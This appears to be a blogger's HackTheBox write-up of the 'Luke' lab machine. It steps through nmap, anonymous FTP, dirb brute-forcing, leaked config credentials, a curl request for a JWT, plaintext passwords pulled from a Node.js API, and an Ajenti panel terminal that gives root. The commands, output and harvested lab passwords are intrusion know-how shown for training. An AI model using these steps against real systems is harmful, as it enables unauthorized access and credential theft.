## Luke Writeup

Hey Guys how are you all,Today we will be doing Luke from HackTheBox This machine has lot's enumeration to get user and credentials and it took me hours to realise that I missed lot's of important link in gobuster so have to resolve it to dirb<br/>
Let's get started with a nmap scan

```
[sarthak@sarthak ~]$ nmap -sV 10.10.10.137 -Pn -v                                                                                      
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-01 15:38 IST                                                                        
NSE: Loaded 43 scripts for scanning.                                                                                                   
Initiating Parallel DNS resolution of 1 host. at 15:38                                                                                 
Completed Parallel DNS resolution of 1 host. at 15:38, 0.01s elapsed
Initiating Connect Scan at 15:38                                                                                                       
Scanning 10.10.10.137 [1000 ports]                             
Discovered open port 80/tcp on 10.10.10.137
Discovered open port 21/tcp on 10.10.10.137
Discovered open port 22/tcp on 10.10.10.137                        
Increasing send delay for 10.10.10.137 from 0 to 5 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.10.137 from 5 to 10 due to max_successful_tryno increase to 5                                          
Discovered open port 3000/tcp on 10.10.10.137                                                                                          
Discovered open port 8000/tcp on 10.10.10.137                      
Completed Connect Scan at 15:38, 39.89s elapsed (1000 total ports)
Initiating Service scan at 15:38                                   
Scanning 5 services on 10.10.10.137        
Completed Service scan at 15:41, 159.57s elapsed (5 services on 1 host)                                                                
NSE: Script scanning 10.10.10.137.                                                                                                     
Initiating NSE at 15:41                                                                                                                
Completed NSE at 15:41, 1.64s elapsed                                                                                                  
Initiating NSE at 15:41                                                                                                                
Completed NSE at 15:41, 1.30s elapsed                                                                                                  
Nmap scan report for 10.10.10.137                                                                                                      
Host is up (0.28s latency).                                        
Not shown: 995 closed ports                                                                                                            
PORT     STATE SERVICE VERSION                                                                                                         
21/tcp   open  ftp     vsftpd 3.0.3+ (ext.1)                                                                                           
22/tcp   open  ssh?
80/tcp   open  http    Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
3000/tcp open  http    Node.js Express framework
8000/tcp open  http    Ajenti http control panel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 202.91 seconds
```
<br/>
We have Ftp opened so first let's enumerate that <br/>


```
[sarthak@sarthak ~]$ ftp 10.10.10.137
Connected to 10.10.10.137.
220 vsFTPd 3.0.3+ (ext.1) ready...
Name (10.10.10.137:sarthak): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
cd150 Here comes the directory listing.
drwxr-xr-x    2 0        0             512 Apr 14 12:35 webapp
226 Directory send OK.
ftp> cd webapp
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-r-xr-xr-x    1 0        0             306 Apr 14 12:37 for_Chihiro.txt
226 Directory send OK.
ftp> get for_Chihiro.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for for_Chihiro.txt (306 bytes).
226 Transfer complete.
306 bytes received in 0.000255 seconds (1.14 Mbytes/s)
ftp>
```
<br/>
So we have got a file 'for_Chihiro.txt' Let's see What this has...<br/>

```
[sarthak@sarthak ~]$ cat for_Chihiro.txt 
Dear Chihiro !!

As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of 
the actual website I've created .
Normally you should know where to look but hurry up because I will delete them soon because of our security policies ! 

Derry  
```

Nothing much ..so let's fire up the dirb<br/>
```
[sarthak@sarthak luke]$ dirb http://10.10.10.137                                                                                       
                                                                                                                                       
-----------------                                                                                                                      
DIRB v2.22                                                                                                                             
By The Dark Raver                                                                                                                      
-----------------                                                                                                                      
                                                                                                                                       
START_TIME: Sat Jun  1 20:12:36 2019                                                                                                   
URL_BASE: http://10.10.10.137/                                                                                                         
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt                                                                                   
                                                                                                                                       
-----------------                                                                                                                      

GENERATED WORDS: 4612                                                           

---- Scanning URL: http://10.10.10.137/ ----
==> DIRECTORY: http://10.10.10.137/css/                                                                                                
+ http://10.10.10.137/index.html (CODE:200|SIZE:3138)                                                                                  
==> DIRECTORY: http://10.10.10.137/js/                                                                                                 
+ http://10.10.10.137/LICENSE (CODE:200|SIZE:1093)                                                                                     
+ http://10.10.10.137/management (CODE:401|SIZE:381)                                                                                   
==> DIRECTORY: http://10.10.10.137/member/                                                                                             
==> DIRECTORY: http://10.10.10.137/vendor/         
```
<br/>
management seems interesting Let's see what it has ....

![](Selection_007.png)

It requires credentials let's keep it for future..
<br/>
Meanwhile in background i ran another dirb for extensions like php,zip,txt...we got a hit

```
[sarthak@sarthak luke]$ dirb http://10.10.10.137 -X .html,.php,.zip,.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Jun  1 21:25:16 2019
URL_BASE: http://10.10.10.137/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_LIST: (.html,.php,.zip,.txt) | (.html)(.php)(.zip)(.txt) [NUM = 4]

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.137/ ----
+ http://10.10.10.137/config.php (CODE:200|SIZE:202) 
```
And from that we got this :)
```
$dbHost = 'localhost'; $dbUsername = 'root'; $dbPassword = 'Zk6heYCyv6ZE9Xcg'; $db = "login"; $conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die("Connect failed: %s\n". $conn -> error);
```
<br/>
So we got :-<br/>

```
username:root
password:Zk6heYCyv6ZE9Xcg
```
<br/>
## Grabbed Token

I tried these credentials on management didn't worked so now let's enumerate port 3000 which is node js framework and it works on JWT so it will require a token and [this](https://medium.com/dev-bits/a-guide-for-adding-jwt-token-based-authentication-to-your-single-page-nodejs-applications-c403f7cf04f4) helped alot to get me a token

so building it with curl<br/>

```
curl -X POST http://10.10.10.137:3000/login -H 'Content-Type: application/json' -d '{"username":"admin", "password":"Zk6heYCyv6ZE9Xcg"}'
```
<br/>

Output

<br/>


```
{"success":true,"message":"Authentication successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5NDA2MjkyLCJleHAiOjE1NTk0OTI2OTJ9.UkWbOSrPqMVTVMpvbwbTetQUAAs3wKohTS7S7kLfoBY"}
```

<br/>
We have a token now we can use it with   ** Authorization: Bearer <token> **  in our burp on port 3000 <br/>

Before that we shall run dirbuster to see any directories or files which could be helpful...

```
[sarthak@sarthak ~]$ dirb http://10.10.10.137:3000

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Jun  1 20:13:03 2019
URL_BASE: http://10.10.10.137:3000/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.137:3000/ ----
+ http://10.10.10.137:3000/login (CODE:200|SIZE:13)                                                                                   
+ http://10.10.10.137:3000/Login (CODE:200|SIZE:13)                                                                                   
+ http://10.10.10.137:3000/users (CODE:200|SIZE:56)                                                                                   
                                                                                                                                      
-----------------
END_TIME: Sat Jun  1 20:35:01 2019
DOWNLOADED: 4612 - FOUND: 3
```
<br/>
we can see login section from where we got our token and we can see users so let's visit users with burp + token...
## More Credentials 
![](Selection_009.png)

Wow so we got users and their roles 

```
[{"ID":"1","name":"Admin","Role":"Superuser"},{"ID":"2","name":"Derry","Role":"Web Admin"},{"ID":"3","name":"Yuri","Role":"Beta Tester"},{"ID":"4","name":"Dory","Role":"Supporter"}]
```
<br/>

After poking around a bit more i figured out we can use name as a directory like ```http://10.10.10.137:3000/users/Admin/```<br/>

![](Selection_010.png)

So by doing the same step and replacing the names i got these credentials

```
{"name":"Derry","password":"rZ86wwLvx7jUxtch"}
{"name":"Admin","password":"WX5b7)>/rp$U)FW"}
{"name":"Yuri","password":"bet@tester87"}
{"name":"Dory","password":"5y:!xa=ybfe)/QD"}
```
<br/>

Now we have a whole new set of credentials so let's try these on management page now ...so i will try ```Derry``` first because he has Web Admin role...

## Access to Management

![](Selection_011.png)
<br/>

We got in and now let's check these configs...<br/>

![](Selection_012.png)

<br/>
we got some config file of ```Ajenti``` service which is running at port 8000 and in the same file we had credentials for agenti<br/>

```
username:-root
password:-KpMasng6S5EtTy9Z
```

## Logging in to Ajenti cms

![](Selection_013.png)

<br/>
Now we have logged in...

## Gaining Root and flag

we will head to **terminal** section...
<br/>
![](Selection_014.png)
<br/>

click on **+ New** To start a new Terminal session 

<br/>
![](Selection_015.png)
<br/>

And as you can see we already got root shell and we got the flag 
![](rickandmorty.gif)

<br/>
That's all for today guys, If you enjoyed today's writeup then stay tuned for more :bowtie:




